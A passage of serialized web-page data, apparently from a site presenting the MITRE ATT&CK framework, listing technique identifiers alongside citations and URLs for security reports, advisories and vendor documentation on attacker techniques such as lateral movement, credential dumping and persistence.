Images on Hosts","https:\u002F\u002Fblog.aquasec.com\u002Fmalicious-container-image-docker-container-host","Assaf Morag. (2020, July 15). Threat Alert: Attackers Building Malicious Images on Your Hosts. Retrieved March 29, 2021.","T1115","T1580","Amazon Describe Instance","https:\u002F\u002Fdocs.aws.amazon.com\u002Fcli\u002Flatest\u002Freference\u002Fssm\u002Fdescribe-instance-information.html","Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020.","T1538","T1526",{},"T1059.002","SentinelOne macOS Red Team","https:\u002F\u002Fwww.sentinelone.com\u002Fblog\u002Fmacos-red-team-calling-apple-apis-without-building-binaries\u002F","Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple APIs Without Building Binaries. Retrieved July 17, 2020.",{},"T1059.007","https:\u002F\u002Fposts.specterops.io\u002Fpersistent-jxa-66e1c3cd1cf5",{},"T1059.008","Cisco IOS Software Integrity Assurance - Command History","https:\u002F\u002Ftools.cisco.com\u002Fsecurity\u002Fcenter\u002Fresources\u002Fintegrity_assurance.html#23","Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Command History. Retrieved October 21, 2020.",{},"T1059.001","http:\u002F\u002Fwww.malwarearchaeology.com\u002Fs\u002FWindows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf","Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7\u002FWin 2008 or later. Retrieved June 24, 2016.","Malware Archaeology PowerShell Cheat Sheet",{},"T1059.006",{},"T1059.004",{},"T1059.005",{},"T1059.003","T1043","T1092","T1175","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fdesktop\u002Fcom\u002Fdcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1","Microsoft. (n.d.). DCOM Security Enhancements in Windows XP Service Pack 2 and Windows Server 2003 Service Pack 1. Retrieved November 22, 2017.","Microsoft COM ACL","https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms687317(v=vs.85).aspx","Microsoft. (n.d.). Setting Process-Wide Security Through the Registry. Retrieved November 21, 2017.","Microsoft Process Wide Com Keys","https:\u002F\u002Fgoogleprojectzero.blogspot.com\u002F2018\u002F04\u002Fwindows-exploitation-tricks-exploiting.html","Forshaw, J. (2018, April 18). Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege. Retrieved May 3, 2018.","ProjectZero File Write EoP Apr 2018","https:\u002F\u002Fenigma0x3.net\u002F2017\u002F01\u002F23\u002Flateral-movement-via-dcom-round-2\u002F","Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round 2. Retrieved November 21, 2017.","Enigma DCOM Lateral Movement Jan 2017","https:\u002F\u002Fenigma0x3.net\u002F2017\u002F09\u002F11\u002Flateral-movement-using-excel-application-and-dcom\u002F","Nelson, M. (2017, September 11). Lateral Movement using Excel.Application and DCOM. Retrieved November 21, 2017.","Enigma Excel DCOM Sept 2017","https:\u002F\u002Fwww.cybereason.com\u002Fblog\u002Fleveraging-excel-dde-for-lateral-movement-via-dcom","Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral movement via DCOM. Retrieved November 21, 2017.","Cyberreason DCOM DDE Lateral Movement Nov 2017",{},"T1586.002","Email Accounts",{},"T1586.001","Social Media Accounts","T1554","ICANNDomainNameHijacking","ICANN Security and Stability Advisory Committee. (2005, July 12). Domain Name Hijacking: Incidents, Threats, Risks and Remediation. Retrieved March 6, 2017.","https:\u002F\u002Fwww.icann.org\u002Fgroups\u002Fssac\u002Fdocuments\u002Fsac-007-en","Talos DNSpionage Nov 2018","https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F11\u002Fdnspionage-campaign-targets-middle-east.html","Mercer, W., Rascagneres, P. (2018, November 27). DNSpionage Campaign Targets Middle East. Retrieved October 9, 2020.","NSA NCSC Turla OilRig","https:\u002F\u002Fmedia.defense.gov\u002F2019\u002FOct\u002F18\u002F2002197242\u002F-1\u002F-1\u002F0\u002FNSA_CSA_Turla_20191021%20ver%204%20-%20nsa.gov.pdf","NSA\u002FNCSC. (2019, October 21). Cybersecurity Advisory: Turla Group Exploits Iranian APT To Expand Coverage Of Victims. Retrieved October 16, 2020.",{},"T1584.005",{},"T1584.002",{},"T1584.001",{},"T1584.004",{},"T1584.003",{},"T1584.006","T1609","T1613","Docker API","https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Fapi\u002Fv1.41\u002F","Docker. (n.d.). Docker Engine API v1.41 Reference. Retrieved March 31, 2021.",{},"T1136.003",{},"T1136.002",{},"T1136.001","https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc772408.aspx","Microsoft. (n.d.). Services. Retrieved June 7, 2016.","TechNet Services",{},"T1543.001","https:\u002F\u002Fwww.alienvault.com\u002Fblogs\u002Flabs-research\u002Foceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update","Eddie Lee. (2016, February 17). OceanLotus for OS X - an Application Bundle Pretending to be an Adobe Flash Update. Retrieved July 5, 2017.","OceanLotus for OS X",{},"T1543.004","https:\u002F\u002Fwww.paloaltonetworks.com\u002Fcontent\u002Fdam\u002Fpan\u002Fen_US\u002Fassets\u002Fpdf\u002Freports\u002FUnit_42\u002Funit42-wirelurker.pdf","Claud Xiao. (n.d.). WireLurker: A New Era in iOS and OS X Malware. Retrieved July 10, 2017.","WireLurker",{},"T1543.002","Linux man-pages: systemd January 2014","http:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002Fman1\u002Fsystemd.1.html","Linux man-pages. (2014, January). systemd(1) - Linux manual page. Retrieved April 23, 2019.",{},"T1543.003","CAPEC-478","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F478.html",{},"T1555.003",{},"T1555.001",{},"T1555.005",{},"T1555.002",{},"T1555.004","T1485","Symantec. (2012, August 16). The Shamoon Attacks. Retrieved March 14, 2019.","https:\u002F\u002Fwww.symantec.com\u002Fconnect\u002Fblogs\u002Fshamoon-attacks","Symantec Shamoon 2012","https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2016\u002F11\u002Ffireeye_respondsto.html","FireEye. (2016, November 30). FireEye Responds to Wave of Destructive Cyber Attacks in Gulf Region. Retrieved January 11, 2017.","FireEye Shamoon Nov 2016","Kaspersky StoneDrill 2017","https:\u002F\u002Fmedia.kasperskycontenthub.com\u002Fwp-content\u002Fuploads\u002Fsites\u002F43\u002F2018\u002F03\u002F07180722\u002FReport_Shamoon_StoneDrill_final.pdf","Kaspersky Lab. (2017, March 7). From Shamoon to StoneDrill: Wipers attacking Saudi organizations and beyond. Retrieved March 14, 2019.","Falcone, R. (2018, December 13). Shamoon 3 Targets Oil and Gas Organization. Retrieved March 14, 2019.","https:\u002F\u002Funit42.paloaltonetworks.com\u002Fshamoon-3-targets-oil-gas-organization\u002F","Unit 42 Shamoon3 2018",{},"T1132.002",{},"T1132.001","T1486","FireEye WannaCry 2017","https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F05\u002Fwannacry-malware-profile.html","Berry, A., Homan, J., and Eitzman, R. (2017, May 23). WannaCry Malware Profile. Retrieved March 15, 2019.",{},"T1565.003",{},"T1565.001",{},"T1565.002",{},"T1001.001",{},"T1001.003",{},"T1001.002","Steganography",{},"T1074.001",{},"T1074.002","T1030","T1530","Cisco Advisory SNMP v3 Authentication Vulnerabilities","https:\u002F\u002Ftools.cisco.com\u002Fsecurity\u002Fcenter\u002Fcontent\u002FCiscoAppliedMitigationBulletin\u002Fcisco-amb-20080610-SNMPv3","Cisco. (2008, June 10). Identifying and Mitigating Exploitation of the SNMP Version 3 Authentication Vulnerabilities. Retrieved October 19, 2020.",{},"T1602.002","US-CERT TA18-106A Network Infrastructure Devices 2018","https:\u002F\u002Fus-cert.cisa.gov\u002Fncas\u002Falerts\u002FTA18-106A","US-CERT. (2018, April 20). Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",{},"T1602.001","https:\u002F\u002Fsupport.office.com\u002Fen-us\u002Farticle\u002Fconfigure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2","Microsoft. (2017, July 19). Configure audit settings for a site collection. Retrieved April 4, 2018.","Microsoft SharePoint Logging","https:\u002F\u002Fconfluence.atlassian.com\u002Fconfkb\u002Fhow-to-enable-user-access-logging-182943.html","Atlassian. (2018, January 9). How to Enable User Access Logging. Retrieved April 4, 2018.","Atlassian Confluence Logging",{},"T1213.001",{},"T1213.002","T1005","T1039","CAPEC-639","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F639.html","T1025",{},"T1491.002",{},"T1491.001","T1140","https:\u002F\u002Fwww.carbonblack.com\u002F2016\u002F09\u002F23\u002Fsecurity-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks\u002F","Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.","Carbon Black Obfuscation Sept 2016","https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2016\u002F11\u002F09\u002Fpowerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos\u002F","Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.","Volexity PowerDuke November 2016","T1610","Kaspersky Sofacy","Kaspersky Lab's Global Research and Analysis Team. (2015, December 4). Sofacy APT hits high profile targets with updated toolset. Retrieved December 10, 2015.","https:\u002F\u002Fsecurelist.com\u002Fsofacy-apt-hits-high-profile-targets-with-updated-toolset\u002F72924\u002F",{},"T1587.002","Code Signing Certificates",{},"T1587.003",{},"T1587.004","Exploits",{},"T1587.001","Malware","T1006",{},"T1561.001",{},"T1561.002","ADSecurity GPO Persistence 2016","https:\u002F\u002Fadsecurity.org\u002F?p=2716","Metcalf, S. (2016, March 14). Sneaky Active Directory Persistence #17: Group Policy. Retrieved March 5, 2019.","Robbins, A. (2018, April 2). A Red Teamer’s Guide to GPOs and OUs. Retrieved March 5, 2019.","https:\u002F\u002Fwald0.com\u002F?p=179","Wald0 Guide to GPOs","Harmj0y Abusing GPO Permissions","http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fredteaming\u002Fabusing-gpo-permissions\u002F","Schroeder, W. (2016, March 17). Abusing GPO Permissions. Retrieved March 5, 2019.","Microsoft - Azure Sentinel ADFSDomainTrustMods","https:\u002F\u002Fgithub.com\u002FAzure\u002FAzure-Sentinel\u002Fblob\u002Fmaster\u002FDetections\u002FAuditLogs\u002FADFSDomainTrustMods.yaml","Microsoft. (2020, December). Azure Sentinel Detections. Retrieved December 30, 2020.","CISA SolarWinds Cloud Detection","https:\u002F\u002Fus-cert.cisa.gov\u002Fncas\u002Falerts\u002Faa21-008a","CISA. (2021, January 8). Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments. Retrieved January 8, 2021.","Microsoft - Update or Repair Federated domain","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Foffice365\u002Ftroubleshoot\u002Factive-directory\u002Fupdate-federated-domain-office-365","Microsoft. (2020, September 14). Update or repair the settings of a federated domain in Office 365, Azure, or Intune. Retrieved December 30, 2020.",{},"T1484.002",{},"T1484.001","Mandiant M Trends 2016","https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fcurrent-threats\u002Fpdfs\u002Frpt-mtrends-2016.pdf","Mandiant. (2016, February 25). Mandiant M-Trends 2016. Retrieved March 5, 2019.","T1482","T1189","http:\u002F\u002Fblog.talosintelligence.com\u002F2017\u002F09\u002Favast-distributes-malware.html","Brumaghin, E. et al. (2017, September 18). CCleanup: A Vast Number of Machines at Risk. Retrieved March 9, 2018.","Talos CCleanup 2017","https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F03\u002Fdissecting_one_ofap.html","Dunwoody, M.. (2017, April 3). Dissecting One of APT29’s Fileless WMI and PowerShell Backdoors (POSHSPY). Retrieved April 5, 2017.","FireEye POSHSPY April 2017","ESET Sednit 2017 Activity","https:\u002F\u002Fwww.welivesecurity.com\u002F2017\u002F12\u002F21\u002Fsednit-update-fancy-bear-spent-year\u002F","ESET. (2017, December 21). Sednit update: How Fancy Bear Spent the Year. Retrieved February 18, 2019.","Data Driven Security DGA","https:\u002F\u002Fdatadrivensecurity.info\u002Fblog\u002Fposts\u002F2014\u002FOct\u002Fdga-part2\u002F","Jacobs, J. (2014, October 2). Building a DGA Classifier: Part 2, Feature Engineering. Retrieved February 18, 2019.",{},"T1568.003",{},"T1568.002",{},"T1568.001","McMichael, T.. (2015, June 8). Exchange and Office 365 Mail Forwarding. Retrieved October 8, 2019.","https:\u002F\u002Fblogs.technet.microsoft.com\u002Ftimmcmic\u002F2015\u002F06\u002F08\u002Fexchange-and-office-365-mail-forwarding-2\u002F","Microsoft Tim McMichael Exchange Mail Forwarding 2",{},"T1114.003",{},"T1114.001",{},"T1114.002","http:\u002F\u002Fwww.sans.org\u002Freading-room\u002Fwhitepapers\u002Fanalyst\u002Ffinding-hidden-threats-decrypting-ssl-34840","Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.","SANS Decrypting SSL","https:\u002F\u002Finsights.sei.cmu.edu\u002Fcert\u002F2015\u002F03\u002Fthe-risks-of-ssl-inspection.html","Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.","SEI SSL Inspection Risks",{},"T1573.002",{},"T1573.001","CAPEC-125","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F125.html","FireEye OpPoisonedHandover February 2016","https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2014\u002F11\u002Foperation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html","Ned Moran, Mike Scott, Mike Oppenheim of FireEye. (2014, November 3). Operation Poisoned Handover: Unveiling Ties Between APT Activity in Hong Kong’s Pro-Democracy Movement. Retrieved April 18, 2019.","FSISAC FraudNetDoS September 2012","https:\u002F\u002Fwww.ic3.gov\u002Fmedia\u002F2012\u002FFraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf","FS-ISAC. (2012, September 17). Fraud Alert – Cyber Criminals Targeting Financial Institution Employee Credentials to Conduct Wire Transfer Fraud. Retrieved April 18, 2019.","Symantec DDoS October 2014","https:\u002F\u002Fwww.symantec.com\u002Fcontent\u002Fen\u002Fus\u002Fenterprise\u002Fmedia\u002Fsecurity_response\u002Fwhitepapers\u002Fthe-continued-rise-of-ddos-attacks.pdf","Wueest, C.. (2014, October 21). The continued rise of DDoS attacks. Retrieved April 24, 2019.","USNYAG IranianBotnet March 2016","https:\u002F\u002Fwww.justice.gov\u002Fopa\u002Fpr\u002Fseven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged","Preet Bharara, US Attorney. (2016, March 24). Retrieved April 23, 2019.",{},"T1499.003",{},"T1499.004",{},"T1499.001",{},"T1499.002","T1611",{},"T1585.002",{},"T1585.001",{},"T1546.008","http:\u002F\u002Fblog.crowdstrike.com\u002Fregistry-analysis-with-crowdresponse\u002F","Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.","Tilbury 2014",{},"T1546.009",{},"T1546.010",{},"T1546.011",{},"T1546.001",{},"T1546.015",{},"T1546.014",{},"T1546.012",{},"T1546.006","https:\u002F\u002Fwww.blackhat.com\u002Fdocs\u002Fus-15\u002Fmaterials\u002Fus-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf","Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.","Writing Bad Malware for OSX",{},"T1546.007",{},"T1546.013",{},"T1546.002",{},"T1546.005",{},"T1546.004",{},"T1546.003","FireEye WMI SANS 2015","https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fsans-dfir-2015.pdf","Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020.","French, D. (2018, October 9). Detecting & Removing an Attacker’s WMI Persistence. Retrieved October 11, 2019.","https:\u002F\u002Fmedium.com\u002Fthreatpunter\u002Fdetecting-removing-wmi-persistence-60ccbb7dff96","Medium Detecting WMI Persistence",{},"T1480.001",{},"T1048.002",{},"T1048.001",{},"T1048.003","T1041",{},"T1011.001",{},"T1052.001",{},"T1567.002",{},"T1567.001","T1190","https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2016-6662","National Vulnerability Database. (2017, February 2). CVE-2016-6662 Detail. Retrieved April 3, 2018.","NVD CVE-2016-6662","https:\u002F\u002Fwww.cisecurity.org\u002Fadvisory\u002Fmultiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution\u002F","CIS. (2017, May 15). Multiple Vulnerabilities in Microsoft Windows SMB Server Could Allow for Remote Code Execution. Retrieved April 3, 2018.","CIS Multiple SMB Vulnerabilities","https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2014-7169","National Vulnerability Database. (2017, September 24). CVE-2014-7169 Detail. Retrieved April 3, 2018.","NVD CVE-2014-7169","T1203","T1212","T1211","T1068","ESET InvisiMole June 2020","https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2020\u002F06\u002FESET_InvisiMole.pdf","Hromcova, Z. and Cherpanov, A. (2020, June). INVISIMOLE: THE HIDDEN PART OF THE STORY. Retrieved July 16, 2020.","Unit42 AcidBox June 2020","https:\u002F\u002Funit42.paloaltonetworks.com\u002Facidbox-rare-malware\u002F","Reichel, D. and Idrizovic, E. (2020, June 17). AcidBox: Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizations. Retrieved March 16, 2021.","T1210","T1133","https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2015\u002F10\u002F07\u002Fvirtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence\u002F","Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.","Volexity Virtual Private Keylogging","T1008","T1083","https:\u002F\u002Fwww.eventtracker.com\u002Ftech-articles\u002Fmonitoring-file-permission-changes-windows-security-log\u002F","Netsurion. (2014, February 19). Monitoring File Permission Changes with the Windows Security Log. Retrieved August 19, 2018.","EventTracker File Permissions Feb 2014",{},"T1222.002",{},"T1222.001","T1495","http:\u002F\u002Fwww.mitre.org\u002Fpublications\u002Fproject-stories\u002Fgoing-deep-into-the-bios-with-mitre-firmware-security-research","Upham, K. (2014, March). Going Deep into the BIOS with MITRE Firmware Security Research. Retrieved January 5, 2016.","MITRE Trustworthy Firmware Measurement","T1187","Wikipedia. (2017, December 16). Server Message Block. Retrieved December 21, 2017.","Wikipedia Server Message Block",{},"T1606.002",{},"T1606.001",{},"T1592.004",{},"T1592.003",{},"T1592.001",{},"T1592.002","OPM Leak","https:\u002F\u002Fwww.opm.gov\u002Fcybersecurity\u002Fcybersecurity-incidents\u002F","Cybersecurity Resource Center. (n.d.). CYBERSECURITY INCIDENTS. Retrieved October 20, 2020.","Register Deloitte","https:\u002F\u002Fwww.theregister.com\u002F2017\u002F09\u002F26\u002Fdeloitte_leak_github_and_google\u002F","Thomson, I. (2017, September 26). Deloitte is a sitting duck: Key systems with RDP open, VPN and proxy 'login details leaked'. Retrieved October 19, 2020.","Register Uber","https:\u002F\u002Fwww.theregister.com\u002F2015\u002F02\u002F28\u002Fuber_subpoenas_github_for_hacker_details\u002F","McCarthy, K. (2015, February 28). FORK ME! Uber hauls GitHub into court to find who hacked database of 50,000 drivers. Retrieved October 19, 2020.","Detectify Slack Tokens","https:\u002F\u002Flabs.detectify.com\u002F2016\u002F04\u002F28\u002Fslack-bot-token-leakage-exposing-business-critical-information\u002F","Detectify. (2016, April 28). Slack bot token leakage exposing business critical information. Retrieved October 19, 2020.","Forbes GitHub Creds","https:\u002F\u002Fwww.forbes.com\u002Fsites\u002Frunasandvik\u002F2014\u002F01\u002F14\u002Fattackers-scrape-github-for-cloud-service-credentials-hijack-account-to-mine-virtual-currency\u002F#242c479d3196","Sandvik, R. (2014, January 14). Attackers Scrape GitHub For Cloud Service Credentials, Hijack Account To Mine Virtual Currency. Retrieved October 19, 2020.","GitHub truffleHog","https:\u002F\u002Fgithub.com\u002Fdxa4481\u002FtruffleHog","Dylan Ayrey. (2016, December 31). truffleHog. Retrieved October 19, 2020.","GitHub Gitrob","https:\u002F\u002Fgithub.com\u002Fmichenriksen\u002Fgitrob","Michael Henriksen. (2018, June 9). Gitrob: Putting the Open Source in OSINT. Retrieved October 19, 2020.",{},"T1589.001",{},"T1589.002",{},"T1589.003",{},"T1590.002",{},"T1590.001",{},"T1590.005",{},"T1590.006",{},"T1590.004",{},"T1590.003","DOB Business Lookup","https:\u002F\u002Fwww.dobsearch.com\u002Fbusiness-lookup\u002F","Concert Technologies . (n.d.). Business Lookup - Company Name Search. Retrieved October 20, 2020.",{},"T1591.002",{},"T1591.001",{},"T1591.003",{},"T1591.004","T1061","T1200","http:\u002F\u002Fgo.cybereason.com\u002Frs\u002F996-YZT-709\u002Fimages\u002FCybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf","Amit Serper. (2016). Cybereason Lab Analysis OSX.Pirrit. Retrieved July 31, 2020.","Cybereason OSX Pirrit","https:\u002F\u002Fblog.malwarebytes.com\u002F101\u002F2015\u002F07\u002Fintroduction-to-alternate-data-streams\u002F","Arntz, P. (2015, July 22). Introduction to Alternate Data Streams. Retrieved March 21, 2018.","MalwareBytes ADS July 2015","Sophos Ragnar May 2020","https:\u002F\u002Fnews.sophos.com\u002Fen-us\u002F2020\u002F05\u002F21\u002Fragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security\u002F","SophosLabs. (2020, May 21). Ragnar Locker ransomware deploys virtual machine to dodge security. Retrieved June 29, 2020.",{},"T1564.005",{},"T1564.001",{},"T1564.002",{},"T1564.003",{},"T1564.004",{},"T1564.006",{},"T1564.007","Autoruns for Windows","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fsysinternals\u002Fdownloads\u002Fautoruns","Mark Russinovich. (2019, June 28). Autoruns for Windows v13.96. Retrieved March 13, 2020.",{},"T1574.012",{},"T1574.001","CAPEC-471","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F471.html",{},"T1574.002",{},"T1574.004",{},"T1574.006","CAPEC-640","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F640.html","http:\u002F\u002Fhick.org\u002Fcode\u002Fskape\u002Fpapers\u002Fneedle.txt","skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.","Uninformed Needle",{},"T1574.005",{},"T1574.007","CAPEC-38","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F38.html",{},"T1574.008","CAPEC-159","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F159.html","http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms687393","Microsoft. (n.d.). WinExec function. Retrieved December 5, 2014.","Microsoft WinExec",{},"T1574.009","https:\u002F\u002Fisc.sans.edu\u002Fdiary\u002FHelp+eliminate+unquoted+path+vulnerabilities\u002F14464","https:\u002F\u002Fsecurityboulevard.com\u002F2018\u002F04\u002Fwindows-privilege-escalation-unquoted-services\u002F","HackHappy. (2018, April 23). Windows Privilege Escalation – Unquoted Services. Retrieved August 10, 2018.",{},"T1574.010",{},"T1574.011","T1062",{},"T1562.008",{},"T1562.002",{},"T1562.007",{},"T1562.004",{},"T1562.001",{},"T1562.003","Microsoft PowerShell Command History","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fpowershell\u002Fmodule\u002Fmicrosoft.powershell.core\u002Fabout\u002Fabout_history?view=powershell-7","Microsoft. (2020, May 13). About History. Retrieved September 4, 2020.","Sophos PowerShell command audit","https:\u002F\u002Fcommunity.sophos.com\u002Fproducts\u002Fintercept\u002Fearly-access-program\u002Ff\u002Flive-discover-response-queries\u002F121529\u002Flive-discover---powershell-command-audit","jak. (2020, June 27). Live Discover - PowerShell command audit. Retrieved August 21, 2020.","Sophos PowerShell Command History Forensics","https:\u002F\u002Fcommunity.sophos.com\u002Fproducts\u002Fmalware\u002Fb\u002Fblog\u002Fposts\u002Fpowershell-command-history-forensics","Vikas, S. (2020, August 26). PowerShell Command History Forensics. Retrieved September 4, 2020.",{},"T1562.006","T1525",{},"T1070.003",{},"T1070.002",{},"T1070.001",{},"T1070.004",{},"T1070.005",{},"T1070.006","T1202","T1105","T1490","CAPEC-569","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F569.html","http:\u002F\u002Fopensecuritytraining.info\u002FKeylogging_files\u002FThe%20Adventures%20of%20a%20Keystroke.pdf","Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016.","Adventures of a Keystroke",{},"T1056.004",{},"T1056.002",{},"T1056.001",{},"T1056.003",{},"T1559.001",{},"T1559.002","T1534","T1149","T1570","T1185",{},"T1557.002",{},"T1557.001","CAPEC-177","https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F177.html","LOLBAS Main Site","https:\u002F\u002Flolbas-project.github.io\u002F","LOLBAS. (n.d.). Living Off The Land Binaries and Scripts (and also Libraries). Retrieved February 10, 2020.",{},"T1036.001",{},"T1036.004",{},"T1036.005",{},"T1036.003",{},"T1036.002",{},"T1036.006","https:\u002F\u002Fclymb3r.wordpress.com\u002F2013\u002F09\u002F15\u002Fintercepting-password-changes-with-function-hooking\u002F","Bialek, J. (2013, September 15). Intercepting Password Changes With Function Hooking. Retrieved November 21, 2017.","Clymb3r Function Hook Passwords Sept 2013","Dell Skeleton","Dell SecureWorks. (2015, January 12). Skeleton Key Malware Analysis. Retrieved April 8, 2019.","https:\u002F\u002Fwww.secureworks.com\u002Fresearch\u002Fskeleton-key-malware-analysis",{},"T1556.001",{},"T1556.004","FireEye - Synful Knock","https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2015\u002F09\u002Fsynful_knock_-_acis.html","Bill Hau, Tony Lee, Josh Homan. (2015, September 15). SYNful Knock - A Cisco router implant - Part I. Retrieved October 19, 2020.",{},"T1556.002",{},"T1556.003",{},"T1578.002","AWS CloudTrail Search","https:\u002F\u002Faws.amazon.com\u002Fpremiumsupport\u002Fknowledge-center\u002Fcloudtrail-search-api-calls\u002F","Amazon. (n.d.). Search CloudTrail logs for API calls to EC2 Instances. Retrieved June 17, 2020.","Azure Activity Logs","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Fazure-resource-manager\u002Fmanagement\u002Fview-activity-logs","Microsoft. (n.d.). View Azure activity logs. Retrieved June 17, 2020.",{},"T1578.001",{},"T1578.003",{},"T1578.004","T1112",{},"T1601.002",{},"T1601.001","T1104","T1026","T1106",{},"T1599.001",{},"T1498.001",{},"T1498.002","T1046","T1135","T1040","T1095","T1571","https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fcc228086.aspx","Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017.","Microsoft DRSR Dec 2017","https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fdd207691.aspx","Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017.","Microsoft GetNCCChanges","https:\u002F\u002Fwiki.samba.org\u002Findex.php\u002FDRSUAPI","SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017.","Samba DRSUAPI","Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017.","Harmj0y DCSync Sept 2015","https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fcc237008.aspx","Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017.","Microsoft NRPC Dec 2017","https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fcc245496.aspx","Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017.","Microsoft SAMR","Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017.","AdSecurity DCSync Sept 2015",{},"T1003.008",{},"T1003.005",{},"T1003.006",{},"T1003.004",{},"T1003.001",{},"T1003.003",{},"T1003.007",{},"T1003.002",{},"T1027.001",{},"T1027.004",{},"T1027.005",{},"T1027.002",{},"T1027.003","NationsBuying","Nicole Perlroth and David E. Sanger. (2013, July 12). Nations Buying as Hackers Sell Flaws in Computer Code. Retrieved March 9, 2017.","https:\u002F\u002Fwww.nytimes.com\u002F2013\u002F07\u002F14\u002Fworld\u002Feurope\u002Fnations-buying-as-hackers-sell-computer-flaws.html","https:\u002F\u002Fcitizenlab.ca\u002F2016\u002F08\u002Fmillion-dollar-dissident-iphone-zero-day-nso-group-uae\u002F","Bill Marczak and John Scott-Railton. (2016, August 24). The Million Dollar Dissident: NSO Group’s iPhone Zero-Days used against a UAE Human Rights Defender. Retrieved December 12, 2016.","PegasusCitizenLab","Fisher, D. (2012, October 31). Final Report on DigiNotar Hack Shows Total Compromise of CA Servers. Retrieved March 6, 